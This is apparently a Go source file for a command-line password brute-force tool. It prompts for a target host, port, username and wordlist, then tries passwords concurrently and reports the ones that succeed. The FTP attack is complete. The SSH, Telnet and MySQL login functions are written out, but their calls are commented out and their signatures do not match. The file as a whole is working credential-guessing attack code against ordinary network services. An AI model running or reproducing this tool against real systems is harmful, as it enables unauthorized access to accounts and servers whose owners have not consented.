package main

import (
	"bufio"
	"database/sql"
	"fmt"
	"log"
	"net"
	"os"
	"strings"
	"sync"
	"time"

	_ "github.com/go-sql-driver/mysql"
	"github.com/jlaffaye/ftp"
	"golang.org/x/crypto/ssh"
)

func bruteforce() {
	bruteOption := 0
	fmt.Println("1-)FTP Brute Force")
	fmt.Println("2-)SSH Brute Force")
	fmt.Println("3-)Telnet Brute Force")
	fmt.Println("4-)Mysql Brute Force")
	fmt.Print("Select your Option: ")
	fmt.Scan(&bruteOption)
	switch bruteOption {
	case 1:
		Brute(1)
	case 2:
		Brute(2)
	case 3:
		Brute(3)
	case 4:
		Brute(4)
	}
}
func Brute(option int) {
	var target string
	var port int
	var username string
	var wordlist string

	defaultWordlist := ""
	switch option {
	case 1:
		defaultWordlist = ".\\wordlists\\ftp.txt"
	case 2:
		defaultWordlist = ".\\wordlists\\ssh.txt"
	case 3:
		defaultWordlist = ".\\wordlists\\telnet.txt"
	case 4:
		defaultWordlist = ".\\wordlists\\mysql.txt"
	}

	fmt.Print("Enter Target (ex: google.com): ")
	fmt.Scan(&target)
	fmt.Print("Enter Port address: ")
	fmt.Scan(&port)
	fmt.Print("Enter username: ")
	fmt.Scan(&username)
	fmt.Print("Enter wordlist path (for default wordlist press Enter): ")

	fmt.Scanln(&wordlist)
	if wordlist == "" {
		wordlist = defaultWordlist
	}

	if target == "" {
		fmt.Println("Empty target")
		return
	}
	if port == 0 || port < 1 || port > 65535 {
		fmt.Println("Invalid port")
		return
	}
	if username == "" {
		fmt.Println("Empty Username")
		return
	}

	file, err := os.Open(wordlist)
	if err != nil {
		fmt.Println("Couldn't open file:", err)
		return
	}
	defer file.Close()

	resultChan := make(chan string)
	var wg sync.WaitGroup
	semaphore := make(chan struct{}, 9)
	go func() {
		for result := range resultChan {
			fmt.Println(result)
		}
	}()

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := scanner.Text()
		wg.Add(1) 

		go func(pass string) {
			defer wg.Done() 
			semaphore <- struct{}{}
			defer func() { <-semaphore }()

			switch option {
			case 1:
				ftpLogin(target, username, pass, port, resultChan) 
			 //case 2:
			 	//sshLogin(target, username, pass, resultChan)
			// case 3:
			// 	telnetLogin(target, username, pass, resultChan)
			// case 4:
			// 	mysqlLogin(target, username, pass, resultChan)
			}
		}(line)
	}

	wg.Wait()
	close(resultChan)
}

func ftpLogin(host, user, pass string, port int, resultChan chan<- string) {
	conn, err := ftp.Dial(fmt.Sprintf("%s:%d", host, port), ftp.DialWithTimeout(2*time.Second))
	if err != nil {
		log.Printf("Connection error: %v\n", err)
		return
	}
	defer conn.Quit()

	err = conn.Login(user, pass)
	time.Sleep(time.Second*1)
	if err == nil {
		resultChan <- fmt.Sprintf("\033[32m Login Successful: %s:%s\033[0m", user, pass)
	} else {
		resultChan <- fmt.Sprintf("Login Failed: %s:%s", user, pass)
	}
}

func sshLogin(host, user, pass string, wg *sync.WaitGroup, resultChan chan<- string) {
	defer wg.Done()

	config := &ssh.ClientConfig{
		User: user,
		Auth: []ssh.AuthMethod{
			ssh.Password(pass),
		},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		Timeout:         5 * time.Second,
	}

	client, err := ssh.Dial("tcp", fmt.Sprintf("%s:22", host), config)
	if err != nil {
		log.Printf("Login Failed: %s:%s\n", user, pass)
		return
	}
	defer client.Close()

	resultChan <- fmt.Sprintf("Login Successful: %s:%s", user, pass)
}

func telnetLogin(host, user, pass string, wg *sync.WaitGroup, resultChan chan<- string) {
	defer wg.Done()

	conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:23", host), 5*time.Second)
	if err != nil {
		resultChan <- fmt.Sprintf("Connection error: %v\n", err)
		return
	}
	defer conn.Close()

	conn.SetDeadline(time.Now().Add(5 * time.Second))

	reader := bufio.NewReader(conn)

	_, err = reader.ReadString(':')
	if err != nil {
		resultChan <- fmt.Sprintf("Error reading from Telnet server: %v", err)
		return
	}

	_, err = conn.Write([]byte(user + "\n"))
	if err != nil {
		resultChan <- fmt.Sprintf("Failed to send username: %s", user)
		return
	}

	_, err = reader.ReadString(':')
	if err != nil {
		resultChan <- fmt.Sprintf("Error reading password prompt: %v", err)
		return
	}

	_, err = conn.Write([]byte(pass + "\n"))
	if err != nil {
		resultChan <- fmt.Sprintf("Failed to send password: %s", pass)
		return
	}

	resp, err := reader.ReadString('\n')
	if err != nil {
		resultChan <- fmt.Sprintf("Failed to read Telnet response: %v", err)
		return
	}

	if strings.Contains(resp, "Login incorrect") {
		resultChan <- fmt.Sprintf("Login Failed: %s:%s", user, pass)
	} else {
		resultChan <- fmt.Sprintf("Login Successful: %s:%s", user, pass)
	}
}

func mysqlLogin(host, user, pass string, wg *sync.WaitGroup, resultChan chan<- string) {
	defer wg.Done()

	dsn := fmt.Sprintf("%s:%s@tcp(%s)/", user, pass, host)

	db, err := sql.Open("mysql", dsn)
	if err != nil {
		resultChan <- fmt.Sprintf("Connection Error: %v", err)
		return
	}
	defer db.Close()

	err = db.Ping()
	if err != nil {
		resultChan <- fmt.Sprintf("Login Failed: %s:%s", user, pass)
	} else {
		resultChan <- fmt.Sprintf("Login Successful: %s:%s", user, pass)
	}
}
